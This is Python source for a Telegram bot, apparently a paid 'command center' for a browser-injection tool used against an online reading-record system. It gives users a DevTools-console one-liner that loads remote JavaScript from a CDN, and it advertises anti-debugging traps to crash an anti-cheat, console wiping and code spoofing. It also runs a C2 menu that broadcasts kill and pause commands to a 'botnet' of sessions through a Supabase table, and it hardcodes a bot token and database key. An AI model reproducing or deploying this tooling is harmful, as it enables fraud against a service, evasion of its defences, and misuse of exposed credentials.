import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import subprocess
import os
import urllib.request
import urllib.parse
import urllib.error
import time
import datetime
import math
import base64
import threading
from concurrent.futures import ThreadPoolExecutor

# iOS 26 LIQUID GLASS & MAX SECURITY EDITION v17.0
TOKEN = '8298046313:AAHqwkuWkTbxSFSZB7DO4fNrfT1hBkMWKVs'
OWNER_ID = 8402309532
bot = telebot.TeleBot(TOKEN)

# AI Chat Queue System (Protects VPS RAM)
ai_queue = ThreadPoolExecutor(max_workers=2)

SUPA_URL = 'https://yzjsmtxhpdlsniqpcuoa.supabase.co/rest/v1/nilam_used_books'
SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl6anNtdHhocGRsc25pcXBjdW9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5Mzk2ODQsImV4cCI6MjA4MDUxNTY4NH0.jMq8BwvYlODSWiFv7ysM7KiDCjzviMEJFdn1Vfst3mw'

START_TIME = time.time()
DB_FILE = 'bot_users_db.json'
_users_cache = None

def load_users():
    global _users_cache
    if _users_cache is not None:
        return _users_cache
    if not os.path.exists(DB_FILE): 
        _users_cache = {}
        return _users_cache
    try:
        with open(DB_FILE, 'r') as f: 
            _users_cache = json.load(f)
            return _users_cache
    except: 
        _users_cache = {}
        return _users_cache

def save_users(users):
    global _users_cache
    _users_cache = users
    with open(DB_FILE, 'w') as f: json.dump(users, f, indent=4)

def get_user_plan(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"plan": "free", "joined": time.time()}
        save_users(users)
    if user_id == OWNER_ID: return "owner"
    return users[uid].get("plan", "free")

def verify_signature(uid, ts, sig):
    # Verifies the HMAC-lite signature from the JS payload to prevent fake telemetry injections
    expected = base64.b64encode(f"{uid}_{ts}_NILAM_SECURE_V17".encode('utf-8')).decode('utf-8').replace('=', '')
    return sig == expected

def get_live_users():
    try:
        req = urllib.request.Request(f"{SUPA_URL}?title=like.__TEL__|*", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
        
        now = int(time.time() * 1000)
        active = []
        for row in data:
            p = row['title'].split('|')
            if len(p) >= 8:
                uid, ts, ok, fail, tgt, status, sig = p[1], int(p[2]), p[3], p[4], p[5], p[6], p[7]
                
                # Security Check: Verify Payload Signature
                if not verify_signature(uid, ts, sig):
                    continue # Drop fake payload

                idle_sec = (now-ts)//1000
                if idle_sec < 300: 
                    active.append({"uid": uid, "ok": int(ok), "tgt": int(tgt), "fail": int(fail), "status": status, "idle": idle_sec})
        return active
    except: return []

def generate_progress_bar(percent, length=15):
    filled = math.floor(length * (percent / 100))
    empty = length - filled
    return "█" * filled + "░" * empty

def get_main_menu(plan):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📡 Secure Telemetry", callback_data="menu_analytics"),
        InlineKeyboardButton("🍏 Get Payload", callback_data="menu_actions")
    )
    if plan == "free":
        markup.add(InlineKeyboardButton("🔓 UNLOCK PRO TIER", callback_data="cmd_upgrade"))
    
    if plan == "owner":
        markup.add(InlineKeyboardButton("👑 Master Node", callback_data="cmd_admin"), InlineKeyboardButton("🗄️ Memory Core", callback_data="menu_db"))
        markup.add(InlineKeyboardButton("🛡️ WAF Diagnostics", callback_data="menu_system"), InlineKeyboardButton("⚔️ Execute C2", callback_data="menu_c2"))
    return markup

def get_c2_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("⏸️ FREEZE NETWORK", callback_data="c2_pause"), InlineKeyboardButton("▶️ RELEASE NETWORK", callback_data="c2_resume"))
    markup.add(InlineKeyboardButton("🛑 TERMINATE (KILL)", callback_data="c2_kill"), InlineKeyboardButton("📢 DEPLOY MESSAGE", callback_data="c2_msg"))
    markup.add(InlineKeyboardButton("🔙 SYSTEM ROOT", callback_data="cmd_main"))
    return markup

def get_upsell_text(plan):
    if plan == "free":
        return "\n\n<blockquote>⚠️ <b>SECURITY ALERT:</b> You are on the <b>FREE TIER</b>.\nPayload execution is capped. You are vulnerable to WAF detection.\n🚀 <b>UPGRADE TO PRO FOR ZERO-TRUST STEALTH & INFINITE EXECUTION.</b></blockquote>\n\n"
    return ""

@bot.message_handler(commands=['start'])
def send_welcome(message):
    plan = get_user_plan(message.chat.id)
    text = (
        "<b>NILAM COMMAND CENTER [v17.0 PRO]</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<blockquote><b>Terminal Access Granted.</b>\n\n"
        "iOS 26 Liquid Glass Interface active. Cryptographic payload signatures enabled. Anti-debugging traps engaged.</blockquote>"
        f"{get_upsell_text(plan)}"
        "Select operational vector:"
    )
    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_main_menu(plan))

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    plan = get_user_plan(message.chat.id)
    if plan == "free":
        bot.reply_to(message, "⚠️ <b>Akses Ditolak.</b>\n\nFungsi AI Chat Assistant eksklusif untuk pelanggan PRO. Sila naik taraf akaun anda.", parse_mode="HTML")
        return
        
    bot.send_chat_action(message.chat.id, 'typing')
    msg = bot.reply_to(message, "🧠 <i>Menjana respons AI...</i>", parse_mode="HTML")
    
    def run_ai(text, chat_id, message_id):
        try:
            cmd = ['/root/.nvm/versions/node/v24.14.1/bin/gemini', '-p', text]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            output = result.stdout.strip()
            if not output:
                output = result.stderr.strip()
                
            # Clean output warnings
            warnings = [
                "Skill \"skill-creator\" from \"/root/.gemini/skills/skill-creator/SKILL.md\" is overriding the built-in skill.",
                "Warning: True color (24-bit) support not detected. Using a terminal with true color enabled will result in a better visual experience.",
                "Ripgrep is not available. Falling back to GrepTool."
            ]
            for w in warnings:
                output = output.replace(w, "")
                
            output = output.strip()
            
            if not output:
                output = "⚠️ <i>Sistem AI sedang sibuk atau soalan tidak jelas. Sila cuba ayat yang lain.</i>"
                
            if len(output) > 4000:
                output = output[:4000] + "...\n[Teks dipotong]"
                
            bot.edit_message_text(output, chat_id=chat_id, message_id=message_id, parse_mode="HTML")
        except subprocess.TimeoutExpired:
            bot.edit_message_text("⏳ Ralat: Gemini AI mengambil masa terlalu lama untuk merespons.", chat_id=chat_id, message_id=message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ Ralat Sistem AI: {str(e)}", chat_id=chat_id, message_id=message_id)
            
    ai_queue.submit(run_ai, message.text, message.chat.id, msg.message_id)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    plan = get_user_plan(call.from_user.id)
    
    owner_cmds = ["menu_db", "menu_system", "menu_c2", "cmd_admin", "c2_pause", "c2_resume", "c2_kill", "c2_msg"]
    if call.data in owner_cmds and plan != "owner":
        bot.answer_callback_query(call.id, "⛔ KERNEL PANIC: Insufficient privileges.", show_alert=True)
        return

    if call.data == "cmd_main":
        send_welcome(call.message)

    elif call.data == "menu_analytics":
        users = get_live_users()
        text = "<b>📡 SECURE TELEMETRY LINK</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        if not users:
            text += "<blockquote>💤 No cryptographically verified links established.</blockquote>"
        else:
            for u in users:
                p_ok, p_tgt = u['ok'], u['tgt']
                prog_pct = (p_ok / p_tgt * 100) if p_tgt > 0 else 0
                text += (
                    f"🍏 <b>TARGET UID:</b> <code>{u['uid']}</code>\n"
                    "<blockquote>"
                    f"INFILTRATION: {p_ok} / {p_tgt} ({prog_pct:.0f}%)\n"
                    f"<code>[{generate_progress_bar(prog_pct, 10)}]</code>\n"
                    f"STATE: <i>{u['status']}</i> | PING: {u['idle']}s ago"
                    "</blockquote>\n"
                )
        text += get_upsell_text(plan)
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Refresh Link", callback_data="menu_analytics"), InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "menu_actions":
        if plan == "free":
            text = (
                "<b>☠️ INJECTION PAYLOAD (FREE TIER)</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Copy and deploy to DevTools Console (F12):\n\n"
                "<blockquote><code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@latest/n_free.js?v='+Date.now();document.head.appendChild(s);</code></blockquote>\n\n"
                "⚠️ <b>WARNING:</b> Basic heuristics active. Vulnerable to 429 WAF bans."
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔓 UNLOCK PRO TIER", callback_data="cmd_upgrade"), InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
        else:
            text = (
                "<b>🍏 INJECTION PAYLOAD v17.0 [MAX SECURITY]</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Copy and deploy to DevTools Console (F12):\n\n"
                "<blockquote><code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@latest/n.js?v='+Date.now();document.head.appendChild(s);</code></blockquote>\n\n"
                "<blockquote><b>Stealth Protocols Active:</b>\n"
                "1. Payload generates encrypted telemetry signatures.\n"
                "2. DOM Self-Destruct active (Console logs wiped & hidden).\n"
                "3. Debugger Traps armed (AINS anti-cheat will crash if triggered).\n"
                "4. iOS 26 Liquid Glass UI implemented.</blockquote>"
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "menu_c2":
        text = "<b>⚔️ C2 EXECUTIVE COMMAND</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Broadcast root-level overrides to all active payload sessions globally.</blockquote>"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_c2_menu())
        
    elif call.data.startswith("c2_"):
        action = call.data.split('_')[1].upper()
        bot.answer_callback_query(call.id, f"Deploying {action}...")
        try:
            timestamp = str(int(time.time() * 1000))
            if action == 'MSG': payload = f"__CMD__|MSG|SYSTEM WIDE ALERT OVERRIDE.|{timestamp}"
            else: payload = f"__CMD__|{action}|{timestamp}"
            
            q = urllib.parse.quote('ilike.__CMD__|*')
            req = urllib.request.Request(f"{SUPA_URL}?title={q}", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
            try: urllib.request.urlopen(req)
            except: pass
            
            req = urllib.request.Request(SUPA_URL, method='POST', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}', 'Content-Type': 'application/json'}, data=json.dumps({"title": payload}).encode('utf-8'))
            urllib.request.urlopen(req)
            text = f"<b>✅ OVERRIDE ACCEPTED</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Signal <b>{action}</b> deployed to the botnet.</blockquote>"
        except:
            text = "<b>❌ SIGNAL FAILED</b>"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="menu_c2")))

    elif call.data == "cmd_upgrade":
        text = (
            "<b>🔓 UNLOCK PRO TIER</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<blockquote><i>\"Secure. Untraceable. Beautiful.\"</i></blockquote>\n\n"
            "<b>PRO CAPABILITIES:</b>\n"
            "🍏 <b>iOS 26 Liquid Glass UI</b> (Apple HIG compliant)\n"
            "🛡️ <b>Encrypted Telemetry Signatures</b> (Prevents fake data)\n"
            "☠️ <b>Anti-Debugging Traps</b> (Crashes AINS anti-cheat tools)\n"
            "👁️ <b>DOM Self-Destruct & Native Code Spoofing</b>\n\n"
            "<blockquote><b>🔥 RM 15.00 / Lifetime License</b></blockquote>"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💳 INITIATE TRANSFER", url="tg://user?id=8402309532"), InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

import threading

def background_gc_worker():
    # BACKEND/AUTOMATION: Garbage Collection & Analytics Thread
    while True:
        try:
            now = int(time.time() * 1000)
            threshold = now - (15 * 60 * 1000) # 15 minutes
            q = urllib.parse.quote('ilike.__TEL__|*')
            req = urllib.request.Request(f"{SUPA_URL}?title={q}", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
            with urllib.request.urlopen(req) as res:
                data = json.loads(res.read().decode('utf-8'))
                for r in data:
                    ts = int(r['title'].split('|')[2])
                    if ts < threshold:
                        # Auto purge old telemetry to optimize DB scaling
                        del_q = urllib.parse.quote(r['title'])
                        del_req = urllib.request.Request(f"{SUPA_URL}?title=eq.{del_q}", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
                        urllib.request.urlopen(del_req)
        except: pass
        time.sleep(300)

if __name__ == "__main__":
    print("NILAM COMMAND CENTER v17.0 (MAX SECURITY) ONLINE.")
    threading.Thread(target=background_gc_worker, daemon=True).start()
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
